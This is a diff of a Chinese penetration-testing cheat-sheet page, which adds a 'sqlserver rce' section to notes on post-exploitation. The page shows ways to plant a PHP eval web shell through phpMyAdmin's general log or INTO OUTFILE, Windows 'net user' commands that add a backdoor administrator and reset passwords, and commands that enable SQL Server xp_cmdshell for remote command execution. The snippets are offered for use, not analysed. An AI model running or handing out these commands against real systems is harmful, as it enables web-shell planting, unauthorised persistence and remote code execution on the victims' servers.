@@ -24,7 +24,7 @@
 <meta property="og:description" content="&amp;#x4E00;&amp;#x3001;&amp;#x5185;&amp;#x7F51;&amp;#x7A7F;&amp;#x900F;0&amp;#x3001;&amp;#x5DE5;&amp;#x5177;&amp;#x4E0B;&amp;#x8F7D;&amp;#x5730;&amp;#x5740;frp:https:&#x2F;&#x2F;diannaobos.com&#x2F;frp&#x2F;proxifier:https:&#x2F;&#x2F;proxifier.soft32.com&#x2F;EarthWorm&amp;#xFF0C;&amp;#x505C;">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-04-07T10:43:29.000Z">
-<meta property="article:modified_time" content="2021-03-12T07:48:07.738Z">
+<meta property="article:modified_time" content="2021-03-29T14:19:06.499Z">
 <meta property="article:author" content="Bkfish">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
@@ -144,7 +144,7 @@
         <span class="column is-narrow">
             
             
-            5 minutes read (About 759 words)
+            5 minutes read (About 779 words)
         </span>
         
     </div>
@@ -192,7 +192,9 @@
 <figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">bash 123.sh 10.10.1<br>nohup bash bash.sh 10.10.13 &gt; 10.10.13.txt &amp;<br>for i in $(seq 150 175);do  bash bash.sh 10.10.$i &gt; 10.10.$i.txt ;done &amp;<br></code></pre></td></tr></tbody></table></figure>
 
 <h3><span id="phpmyadmin">phpmyadmin</span></h3><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs mysql">SHOW VARIABLES LIKE &apos;%general%&apos; <br>set global general_log=on;<br>set global general_log_file=&apos;C:/phpStudy/WWW/1.php&apos;;<br>select &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;; <br><br>show variables like &#x2018;%secure_file_priv%&#x2019;;<br>select &apos;&lt;?php eval($_POST[&quot;pwd&quot;]);?&gt;&apos; into outfile &apos;C:/phpStudy/WWW/1.php&apos;;<br></code></pre></td></tr></tbody></table></figure>
-<h3><span id="&#x65B0;&#x589E;&#x7528;&#x6237;">&#x65B0;&#x589E;&#x7528;&#x6237;</span></h3><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">net user test test /add<br>net localgroup administrators testuser /add<br>net localgroup users test /del <br>net user test 123456       &#x6539;&#x53D8;test&#x7528;&#x6237;&#x5BC6;&#x7801;&#x4E3A;123456&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x77E5;&#x9053;&#x539F;&#x5BC6;&#x7801; <br></code></pre></td></tr></tbody></table></figure></body></html>
+<h3><span id="&#x65B0;&#x589E;&#x7528;&#x6237;">&#x65B0;&#x589E;&#x7528;&#x6237;</span></h3><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">net user test test /add<br>net localgroup administrators testuser /add<br>net localgroup users test /del <br>net user test 123456       &#x6539;&#x53D8;test&#x7528;&#x6237;&#x5BC6;&#x7801;&#x4E3A;123456&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x77E5;&#x9053;&#x539F;&#x5BC6;&#x7801; <br></code></pre></td></tr></tbody></table></figure>
+
+<h3><span id="sqlserver-rce">sqlserver rce</span></h3><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">exec master..xp_cmdshell &quot;whoami&quot;<br><br>EXEc sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;exec sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;<br></code></pre></td></tr></tbody></table></figure></body></html>
     
     </div>
     
